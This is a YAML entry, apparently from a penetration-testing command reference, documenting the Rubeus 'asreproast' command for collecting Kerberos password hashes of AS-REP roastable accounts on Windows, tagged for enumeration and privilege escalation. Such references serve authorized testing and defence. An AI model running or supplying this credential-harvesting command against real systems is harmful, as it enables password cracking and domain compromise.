---
description: |
  Get Kerberos password hashes from all AS-REP roastable users

  Command Reference:


command: |
  Rubeus.exe asreproast
items:
  - Shell
target: |
  - Windows_target
OS:
  - Windows
environment: |
  - Local
  - Network
command_types:
  - Host_Enumeration
  - Privilege_Escalation
services:
  - Kerberos
references:
  - https://github.com/GhostPack/Rubeus
---
